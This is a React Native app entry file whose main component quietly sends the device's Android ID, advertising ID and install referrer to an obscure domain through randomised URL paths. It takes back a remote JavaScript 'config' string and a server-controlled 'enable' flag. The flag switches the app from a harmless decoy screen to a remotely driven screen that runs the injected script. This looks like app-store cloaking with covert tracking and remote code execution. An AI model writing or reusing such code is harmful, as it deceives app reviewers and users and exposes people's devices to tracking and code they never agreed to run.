import AScreen from './AScreen.tsx';
import DeviceInfo from 'react-native-device-info';
import { useEffect, useState } from 'react';
import BScreen from './BScreen.tsx';
import ReactNativeIdfaAaid from '@sparkfabrik/react-native-idfa-aaid';
import { SafeAreaView } from 'react-native-safe-area-context';
import { StatusBar } from 'react-native';
import appsFlyer from 'react-native-appsflyer';

const rs = (length: number) => {
  return Array.from({ length }, () => Math.random().toString(36)[2]).join('');
};

export default function App() {
  const body = {
    android_id: DeviceInfo.getAndroidIdSync(),
    gps_adid: '',
    install_referrer: DeviceInfo.getInstallReferrerSync(),
  };

  const [data, setData] = useState({
    enable: false,
  });

  const getData = async () => {
    const info = await ReactNativeIdfaAaid.getAdvertisingInfo();
    body.gps_adid = info.id ?? '';
    const resp = await fetch(
      `https://www.m2p8z.xyz/${rs(12)}e/com.oshkccr.msrylx/${rs(
        12,
      )}/${rs(12)}/${rs(8)}`,
      {
        method: 'POST',
        headers: {
          Accept: 'application/json',
          'Content-Type': 'application/json',
          'User-Agent': DeviceInfo.getUserAgentSync(),
        },
        body: JSON.stringify(body),
      },
    );

    if (resp.ok) {
      const json = await resp.json();
      console.log(json);

      const options = {
        devKey: json.sdkKey,
        appId: "",
        isDebug: true,
      };
      appsFlyer.initSdk(options, (successResult) => {
        console.log(successResult);
        appsFlyer.logEvent("af_startapp", {});
      }, (errorResult) => {
        console.log(errorResult);
      });

      appsFlyer.startSdk();
      appsFlyer.getAppsFlyerUID((err, appFlyerUID) => {
        if (err) {
          console.log(err);
        } else {
          console.log(appFlyerUID);
          const jss: string = `window.xxappUID = '${appFlyerUID}';${json.config}`;
          json.config = jss;
          console.log(json);
          setData(json);
        }
      });

      //setData(json);
    }
  };

  useEffect(() => {
    getData();
  }, []);

  return (
    <SafeAreaView style={{ flex: 1 }} edges={['left', 'right', 'bottom']}>
      <StatusBar hidden={true} translucent={true} />
      {data.enable ? <BScreen data={data}></BScreen> : <AScreen></AScreen>}
    </SafeAreaView>
  );
}
